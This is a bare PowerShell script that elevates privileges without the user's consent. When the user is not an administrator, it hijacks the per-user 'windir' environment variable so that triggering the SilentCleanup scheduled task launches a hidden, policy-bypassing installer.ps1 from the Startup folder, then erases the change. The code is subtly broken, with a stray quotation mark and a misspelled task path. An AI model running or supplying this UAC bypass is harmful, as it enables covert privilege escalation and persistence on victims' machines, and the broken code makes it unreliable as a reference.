if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    ./installer.ps1"
} else {
   $registryPath = "HKCU:\Environment"
   $PSCommandPath = "C:\Users\darkd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\installer.ps1"
   $Name = "windir"
   $Value = "powershell -ep bypass -w h $PSCommandPath; #"
   Set-ItemProperty -Path $registryPath -Name $name -Value $Value
   Sleep(10)
   schtasks /run /tn \Micrisoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
   Sleep(10000)
   Remove-ItemProperty -Path $registryPath -Name $name
}
